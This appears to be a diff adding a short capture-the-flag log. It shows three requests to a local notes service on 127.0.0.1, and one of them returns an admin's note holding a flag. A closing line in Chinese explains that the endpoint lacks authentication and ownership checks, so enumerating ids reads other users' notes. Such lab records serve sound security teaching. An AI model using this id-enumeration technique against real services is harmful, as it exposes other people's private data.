@@ -1,0 +1,10 @@
+GET http://127.0.0.1:18081/notes?id=1
+{"id": "1", "note": "alice-note", "viewer": null}
+
+GET http://127.0.0.1:18081/notes?id=2
+{"id": "2", "note": "admin-secret-FLAG{idor_user2}", "viewer": null}
+
+GET http://127.0.0.1:18081/notes?id=3
+{"error": "no note"}
+
+解读：/notes 无鉴权、无所有权校验，直接遍历 id 即可读取他人（admin, uid=2）笔记 → FLAG{idor_user2}。
